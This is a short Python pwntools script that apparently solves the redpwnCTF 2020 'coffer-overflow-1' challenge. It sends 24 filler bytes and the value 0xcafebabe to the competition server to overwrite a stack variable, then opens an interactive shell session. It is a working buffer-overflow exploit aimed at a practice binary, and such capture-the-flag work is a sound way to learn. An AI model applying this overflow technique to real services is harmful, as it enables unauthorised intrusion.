#!/usr/bin/env python3

from pwn import *

offset = 24

r = remote("2020.redpwnc.tf", 31255)
	#r = process("./coffer-overflow-1")

payload = b"M"*offset
payload += p64(0xcafebabe)


    # good luck pwning :)
for _ in range(2):
	r.recvline()

r.sendline(payload)

offset += 1
print("Offset used ", offset)


r.interactive()

